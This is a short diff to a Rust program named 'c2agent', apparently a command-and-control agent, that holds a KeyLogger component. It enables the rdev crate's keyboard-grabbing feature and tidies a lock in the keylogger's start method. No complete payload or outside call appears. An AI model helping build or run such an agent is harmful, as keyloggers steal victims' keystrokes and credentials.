@@ -11,7 +11,7 @@
 //   serde = { version = "1", features = ["derive"] }
 //   serde_json = "1"
 //   hostname = "0.4"
-//   rdev = "0.5"
+//   rdev = { version = "0.5", features = ["unstable_grab"] }
 //
 // Build:  cargo build --release  (binary: target/release/c2agent)
 // Run:
@@ -128,7 +128,7 @@ impl KeyLogger {
     }
 
     fn start(&mut self) -> String {
-        let mut active = self.active.lock().unwrap();
+        let active = self.active.lock().unwrap();
         if *active {
             return "keylogger already running".into();
         }
